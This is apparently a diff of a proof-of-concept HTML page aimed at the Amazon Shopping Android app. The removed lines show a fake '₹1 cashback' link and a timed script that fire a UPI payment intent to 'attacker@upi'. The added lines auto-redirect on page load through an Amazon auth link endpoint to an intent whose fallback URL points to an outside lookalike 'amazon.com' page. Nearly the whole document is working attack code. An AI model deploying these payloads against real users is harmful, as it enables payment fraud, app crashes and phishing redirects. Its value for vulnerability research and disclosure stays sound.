@@ -6,18 +6,14 @@
   <body>
     <h1>Amazon Shopping UPI Crash PoC</h1>
 
-    <p>
-      <a href='intent://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;end'>
-        Click for ₹1 cashback
-      </a>
-    </p>
 
     <script>
-      // Optional auto-fire after 3 seconds
-      setTimeout(function () {
-        location.href =
-          'intent://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;end';
-      }, 3000);
+      const rawRedirect = 'intent://amazon-shopping-test/#Intent;scheme=https;package=in.amazon.mShop.android.shopping;S.browser_fallback_url=https://probear0001.github.io/amazon.com/;end';
+
+      const url ='https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=' +
+        encodeURIComponent(rawRedirect);
+
+      window.location.href = url;
     </script>
   </body>
 </html>
